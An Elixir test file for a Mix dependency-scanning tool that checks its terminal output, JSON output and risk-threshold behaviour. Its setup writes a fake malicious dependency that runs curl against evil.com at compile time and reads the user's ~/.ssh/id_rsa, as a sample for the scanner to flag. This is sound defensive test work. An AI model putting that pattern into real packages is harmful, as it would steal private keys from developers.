defmodule VetCli.E2E.MixVetTest do
  use ExUnit.Case, async: true

  import ExUnit.CaptureIO

  setup do
    tmp_dir = Path.join(System.tmp_dir!(), "vet_e2e_mix_#{System.unique_integer([:positive])}")
    File.mkdir_p!(tmp_dir)

    # Create mix.lock
    lock_content = ~s(%{\n  "clean_dep": {:hex, :clean_dep, "1.0.0", "abc123", [:mix], [], "hexpm", "def456"},\n  "suspicious_dep": {:hex, :suspicious_dep, "0.1.0", "xyz789", [:mix], [], "hexpm", "uvw012"},\n})
    File.write!(Path.join(tmp_dir, "mix.lock"), lock_content)

    # Create clean_dep
    clean_lib = Path.join([tmp_dir, "deps", "clean_dep", "lib"])
    File.mkdir_p!(clean_lib)

    File.write!(Path.join(clean_lib, "clean.ex"), """
    defmodule Clean do
      def hello, do: :world
    end
    """)

    File.write!(Path.join([tmp_dir, "deps", "clean_dep", "mix.exs"]), """
    defmodule CleanDep.MixProject do
      use Mix.Project
      def project, do: [app: :clean_dep, version: "1.0.0"]
    end
    """)

    # Create suspicious_dep with system exec and file access
    sus_lib = Path.join([tmp_dir, "deps", "suspicious_dep", "lib"])
    File.mkdir_p!(sus_lib)

    File.write!(Path.join(sus_lib, "sus.ex"), ~S"""
    defmodule Suspicious do
      System.cmd("curl", ["https://evil.com"])
      def steal, do: File.read!(Path.expand("~/.ssh/id_rsa"))
    end
    """)

    File.write!(Path.join([tmp_dir, "deps", "suspicious_dep", "mix.exs"]), """
    defmodule SuspiciousDep.MixProject do
      use Mix.Project
      def project, do: [app: :suspicious_dep, version: "0.1.0"]
    end
    """)

    on_exit(fn -> File.rm_rf!(tmp_dir) end)
    %{project_path: tmp_dir}
  end

  describe "default scan (terminal output)" do
    test "produces terminal output with header and findings", %{project_path: path} do
      output =
        capture_io(fn ->
          Mix.Tasks.Vet.run(["--path", path, "--skip-hex"])
        end)

      # Header should be present
      assert output =~ "Vet"

      # Suspicious dep should appear with findings
      assert output =~ "suspicious_dep"

      # Should show critical-level indicator for system exec at compile time
      assert output =~ "CRIT" or output =~ "CRITICAL"
    end
  end

  describe "JSON output format" do
    test "produces valid parseable JSON with dependencies", %{project_path: path} do
      output =
        capture_io(fn ->
          Mix.Tasks.Vet.run(["--path", path, "--skip-hex", "--format", "json"])
        end)

      assert {:ok, parsed} = Jason.decode(output)
      assert is_list(parsed["dependencies"])
      assert length(parsed["dependencies"]) == 2

      # At least one dep should have findings
      sus =
        Enum.find(parsed["dependencies"], fn d -> d["name"] == "suspicious_dep" end)

      assert sus != nil
      assert length(sus["findings"]) > 0
    end
  end

  describe "threshold - pass (high threshold)" do
    test "does not raise when all deps are below threshold", %{project_path: path} do
      # Should complete without raising — threshold 200 is above any possible score
      capture_io(fn ->
        Mix.Tasks.Vet.run(["--path", path, "--skip-hex", "--threshold", "200"])
      end)
    end
  end

  describe "threshold - fail (low threshold)" do
    test "raises Mix.Error when a dep exceeds threshold", %{project_path: path} do
      assert_raise Mix.Error, ~r/exceeds threshold/, fn ->
        capture_io(fn ->
          Mix.Tasks.Vet.run(["--path", path, "--skip-hex", "--threshold", "1"])
        end)
      end
    end
  end

  describe "non-existent project path" do
    test "raises Mix.Error for missing project" do
      assert_raise Mix.Error, ~r/scan failed/, fn ->
        capture_io(fn ->
          Mix.Tasks.Vet.run(["--path", "/tmp/nonexistent_vet_project_abc", "--skip-hex"])
        end)
      end
    end
  end

  describe "help flag" do
    test "VetCli.main with --help prints usage information" do
      output =
        capture_io(fn ->
          VetCli.main(["--help"])
        end)

      assert output =~ "Usage"
      assert output =~ "--path"
      assert output =~ "--format"
      assert output =~ "--threshold"
      assert output =~ "--skip-hex"
    end
  end
end
